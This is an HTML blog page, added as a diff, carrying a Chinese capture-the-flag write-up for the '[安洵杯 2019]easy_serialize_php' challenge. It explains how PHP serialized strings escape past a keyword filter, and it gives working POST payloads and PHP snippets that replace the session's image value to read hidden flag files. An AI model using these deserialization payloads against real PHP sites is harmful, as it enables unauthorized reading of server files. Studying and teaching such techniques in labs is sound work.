@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[安洵杯 2019]easy_serialize_php | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[安洵杯 2019]easy_serialize_php</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="/2024/05/05/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505155919167.png" alt="image-20240505155919167"></p>
+<p>看到phpinfo旁边的提示了，尝试观察phpinfo</p>
+<p><img src="/2024/05/05/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505160605676.png" alt="image-20240505160605676"></p>
+<p>找到了这个</p>
+<p>再往后尝试 show_image，没什么用</p>
+<p>但是我们仔细看看就会发现只有传了show_image才能进行反序列化</p>
+<p>所以，<strong>当f&#x3D;show_image是可以读文件的，只要$userinfo[‘img’]是相应的flag.php的base64加密</strong></p>
+<p>所以之后就来看看serialize_info</p>
+<p>filter是过滤用的</p>
+<h4 id="一、phpflag"><a href="#一、phpflag" class="headerlink" title="一、phpflag"></a>一、phpflag</h4><p>原理:因为序列化的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后要。</p>
+<p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#正规序列化的字符串</span><br><span class="line">$a = &quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line">#带有多余的字符的字符串</span><br><span class="line">$a_laji = &quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;;</span><br><span class="line">var_dump(unserialize($a_laji));</span><br></pre></td></tr></table></figure>
+
+<p>我们有了这个逃逸概念的话，就大概可以理解了。如果我们把</p>
+<p>$_SESSION[‘img’] &#x3D; base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去，</p>
+<p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p>
+<p>那如何达到这个目的就要通过过滤函数了，因为咱的序列化的是个字符串啊，然后他又把黑名单的东西替换成空。</p>
+<p>post一个数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ZDBnM19mMWFnLnBocA&#x3D;&#x3D;也就是d0g3_f1ag.php的base64加密。</p>
+<p>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;}这个肯定就是我们预期的那段序列化字符，</p>
+<p>那么 ;s:1:”1”; 这几个字符呢?</p>
+<p>如果使用大佬的payload那么可以明白，现在的_SESSION就存在两个键值即phpflag和img对应的键值对。</p>
+<p>并且这个字符串得好好读才能不蒙圈。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;phpflag&#x27;]=&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;;</span><br><span class="line">$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">var_dump( serialize($_SESSION) );</span><br><span class="line">#&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;</span><br><span class="line">;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>经过filter过滤后phpflag就会被替换成空，</p>
+<p>s:7:”phpflag”;s:48:” 就变成了 s:7:””;s:48:”;即完成了逃逸。</p>
+<p>两个键值分别被序列化成了</p>
+<p>s:7:””;s:48:”;s:1:”1”;即键名叫”;s:48: 对应的值为一个字符串1。这个键值对只要能瞒天过海就行。</p>
+<p>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;键名img对应的字符串是d0g3_f1ag.php的base64编码。</p>
+<p>右花括号后面的;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;”;}”全被当成孤儿放弃了。</p>
+<p>发现&#x2F;d0g3_fllllllag,base64加密，替换原字符串</p>
+<h4 id="二、session"><a href="#二、session" class="headerlink" title="二、session"></a>二、session</h4><p>这里将下面的东西进行序列化</p>
+<p>$_SESSION[“user”] &#x3D; ‘guest’;<br>$_SESSION[‘function’] &#x3D; ‘a’;<br>$_SESSION[‘img’] &#x3D; ‘ZDBnM19mMWFnLnBocA&#x3D;&#x3D;’;&#x2F;&#x2F;d0g3_f1ag.php base64编码<br>var_dump(serialize($_SESSION));<br>&#x2F;&#x2F;得到<br>string(90)”a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:1:”a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;}”<br>将这里的user和function进行修改，然后这里会进行代码一开始的过滤，将变量$img中的php flag php5 php4 fl1g的字符串替换成’’空字符</p>
+<p>$_SESSION[“user”] &#x3D; ‘flagflagflagflagflagflag’;<br>$_SESSION[‘function’]&#x3D; &#x3D; ‘a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:2:”dd”;s:1:”a”;}’;<br>$_SESSION[‘img’]&#x3D;’ZDBnM19mMWFnLnBocA&#x3D;&#x3D;’; </p>
+<p>&#x2F;&#x2F; d0g3_f1ag.php base64编码</p>
+<p>序列化后</p>
+<p><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>将flag进行了过滤</p>
+<p><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;#&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>由于s:24 会往后边读取24位字符”;s:8:”function”;s:59:”a做为user的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃</p>
+<p>payload：</p>
+<p>_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:2:”dd”;s:1:”a”;}</p>
+<p>得到了flag in &#x2F;d0g3_fllllllag</p>
+<p><img src="/2024/05/05/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505180449554.png" alt="image-20240505180449554"></p>
+<p>两者核心都在于通过构造某个变量，使得后面的变量无效化</p>
+<p>最后将&#x2F;d0g3_fllllllag,base64加密</p>
+<p>得到L2QwZzNfZmxsbGxsbGFn</p>
+<p>替换flag.php机密过后的结果，即可获得flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
